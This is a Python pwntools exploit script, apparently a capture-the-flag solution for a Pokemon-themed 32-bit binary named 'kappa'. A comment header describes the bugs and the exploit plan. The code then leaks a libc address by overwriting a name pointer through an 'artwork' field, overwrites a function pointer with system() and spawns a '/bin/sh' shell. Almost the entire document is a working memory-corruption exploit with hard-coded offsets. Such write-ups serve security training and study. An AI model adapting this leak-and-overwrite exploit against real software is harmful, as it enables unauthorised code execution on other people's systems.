#!/usr/bin/env python2

from pwn import *

'''
bugs:
if you have a charizard, you can set the charizards artwork so that bird_attack_name points to a mem location and it will leak that memlocation by switching to the charizard in a fight

when catching a pokemon when you are full, it does not set the poke_type correctly. so if you replace a kakuna with the charizard, the function pointer will point to inside the artwork (so we can set that to system())

also: choose_pokemon can return -1. I don't think this is useful for exploitation.

exploit strat:
catch 4 kakunas
catch the charizard, replace on of the kakunas with it. Name the charizard /bin/sh Change artwork, set charizard->bird_attack_name to a pointer to stdin@data, set charizard->bird_health to a high value. Then go into battle, switch to charizard, attack something to leak libc address. Then change artwork of charizard again, set charizard->kakuna_proc to system@libc.

then inspect ur pokes to get shell!

offsets:
artwork offset: 0x0F
kakuna_proc: 0x210
bird_health: 0x5ec
bird_attack_name: 0x5f4
'''
#context.log_level = 'DEBUG'
context.terminal = ['gnome-terminal', '-e']
elf = ELF("./kappa")
libc = ELF("/lib/i386-linux-gnu/i686/cmov/libc-2.19.so")
r = process("./kappa_nosleep")
#r = gdb.debug("./kappa_nosleep")

grass_ctr = 0
num_caught = 0

def catch_poke(name="poop", run=False):
    global grass_ctr, num_caught
    grass_ctr += 1
    r.recvuntil("work\n\n")
    r.sendline("1")
    r.recvuntil(".\n.\n.\n")
    l = r.recvline()
    if l.startswith("You"):
        # no pokemon
        return
    if run and num_caught >= 4:
        r.sendline("3")
        return

    if grass_ctr % 13 != 0:
        # kakuna
        r.sendline('2')
        r.recvuntil("?\n")
        r.sendline(name)
        num_caught += 1
        return
    # charizard
    # attack 4 times
    for _ in range(0, 4):
        r.recvuntil("Run\n")
        r.sendline("1")
    r.recvuntil("Run\n")
    r.sendline("2")
    r.recvuntil("?\n")
    r.sendline(name)

# catch the kakunas, keep 4 and see 13
for _ in range(12):
    catch_poke("poop", True)

# now catch the charizard
catch_poke("/bin/sh")
# replace pokemon 2
r.sendline("2")
r.recvuntil("work\n\n")

# now set artwork: leak _IO_stdin (offset: 0x001a9c20)
# address is something in main that points to stdin
artwork = fit({0x5f4-0xf:p32(0x80492b3), 0x5ec-0xf:p32(1000)}, length=2128)
r.sendline("5")
r.sendline("2")
r.send(artwork)
r.recvuntil("friends!\n")

# now fight a poke, leak libc
r.recvuntil("work\n\n")
r.sendline("1")
r.recvuntil("Run\n")
r.sendline("4")
r.sendline("2")
r.recvuntil("Run\n")
r.sendline("1")
r.recvuntil("used ")
stdin_addr = u32(r.recvn(4))
libc_base = stdin_addr - 0x001a9c20
log.info("Leaked libc base: " + hex(libc_base))

# now set the kakuna proc to system in the artwork
artwork = fit({0x210-0xf:p32(libc_base + libc.symbols["system"])}, length=2127)
r.recvuntil("work\n\n")
r.sendline("5")
r.sendline("2")
r.send(artwork)
r.recvuntil("work\n\n")

# now inspect to run system
r.sendline("3")
r.interactive()
